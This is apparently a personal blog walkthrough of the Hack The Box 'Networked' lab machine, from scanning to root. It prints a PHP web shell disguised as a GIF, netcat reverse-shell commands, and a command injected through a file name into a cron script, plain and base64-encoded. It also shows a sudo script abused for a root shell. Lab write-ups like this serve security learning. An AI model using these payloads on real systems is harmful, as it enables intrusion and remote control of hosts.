---
layout: post
title: HTB Networked Walkthrough
categories: [HTB, CTF, OSCP]
---

Hi all another easy box from TJnull list. Lets get dive into it.

![](/images/networked/logo.png)

We start with default nmap script

```bash
nmap -sC -sV -oA nmap/inital 10.10.10.146
# Nmap 7.91 scan initiated Sun Feb  7 00:02:31 2021 as: nmap -sC -sV -oA nmap/inital 10.10.10.146
Nmap scan report for 10.10.10.146
Host is up (0.62s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  7 00:04:01 2021 -- 1 IP address (1 host up) scanned in 90.45 seconds
```

We have few ports open
* 22 for SSH
* 80 for HTTP
* 443 look like close. Not quite sure why this show in this report

I run nmap on all ports but no new port. 

I look into website and there was not much to look. I stat gobuster to brute-force some endpoints

```bash
gobuster dir -u http://10.10.10.146 -t 25 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.146
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/07 00:07:21 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
===============================================================
2021/02/07 00:50:57 Finished
===============================================================
```

Backup looks really interesting....

![](/images/networked/backup.png)

We download file, extracted and have a look. It seems in contain our web application. I am terrible with php so I immediately shift to upload.php. I create simple file that contains only magic bite of gif file. 

```bash
$ file test.gif 
test.gif: GIF image data, version 87a, 2592 x
$ cat test.gif              
GIF87a
```

i uploaded this file and accept it. THem i struggle with php. As i was not really good with php i tried to upload file with 2 extensions. php.gif that work.. 

![](/images/networked/uploaded.png)

Shell i used to get this bypass is 

```bash
cat shell1.php.gif 
GIF87a 
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
```

I tru to run some command and i have RCE on server

![](/images/uploaded/rce.png)

I launch my burpsuite and send this request to repeated. Visited payload all the things to find simple revershe netcat shell
and uploaded it.

![](/images/networked/reverse-shell.png)

Lunch netcat listener

```bash
nc -nlvp 4444
listening on [any] 4444 ...              
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.146] 44440
sh: no job control in this shell                                                          
sh-4.2$ whoami                               
whoami
apache                                                                  
sh-4.2$
```

I found some interesting script in home directory of user

```php                            
<?php           
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';        
$to = 'guly';                              
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";                            
$files = array(); 
$files = preg_grep('/^([^.])/', scandir($path));  

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {                       
        continue;                 
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

It was checking if file contain any wrong name in upload folder. As we want to somehow tamper nohup function I created simple file with touch command.

```bash
touch "a; nc -e /bin/bash 10.10.14.24 9001; b"
```

I lunch my listener but everytime this script run i would received connection from server but it was immediatelly closed. As connection was trigger without shell i had to somehow change /bin/bash. I think it cause some issue with triggering. Them i decide to base64 encode script and this command instead.

```bash
a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjI0IDkwMDEK | base64 -d | sh ; b
```
 
I lunch my listener and wait
```bash
nc -nlvp 9001                                                                                                     
listening on [any] 9001 ...                                                                                           
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.146] 34796                                                         
ls                                                                                                                    
check_attack.php                                          
crontab.guly                                               
user.txt                                                   
whoami                                                     
guly                                                       
python -c "import pty;pty.spawn('/bin/bash')"
[guly@networked ~]$ sudo -l
sudo -l                                          
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,                    
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",                               
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
                                                           
User guly may run the following commands on networked:                                                                
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

I can run this script as admin? I immediatelly lunch it to get some feeling for application

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
a b                                
interface PROXY_METHOD:
c d                                 
interface BROWSER_ONLY:
e f
interface BOOTPROTO:
g h
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: b: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: d: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: f: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: h: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: b: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 5: d: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 6: f: command not found
/etc/sysconfig/network-scripts/ifcfg-guly: line 7: h: command not found
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```

It cannot run command b? :) DO you think what I am thinking? 

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
a /bin/bash
interface PROXY_METHOD:
a a 
wrong input, try again
interface BROWSER_ONLY:
f
interface BOOTPROTO:
d
[root@networked network-scripts]#
```

I rooted box! Thank you for reading.   